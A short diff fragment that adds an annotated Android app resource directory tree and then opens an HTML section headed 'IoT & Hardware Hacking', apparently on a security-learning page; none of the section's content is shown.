+├── res/                         ← Resources (images, layouts, strings)
+│   ├── drawable/               ← Images and icons
+│   ├── layout/                 ← XML UI layouts
+│   └── values/                 ← Strings, colors, dimensions
+└── kotlin/                      ← Kotlin metadata (if app uses Kotlin)
 
         <!-- SECTION 3: IoT & Hardware Hacking -->
         <section id="iot-hardware" class="section">
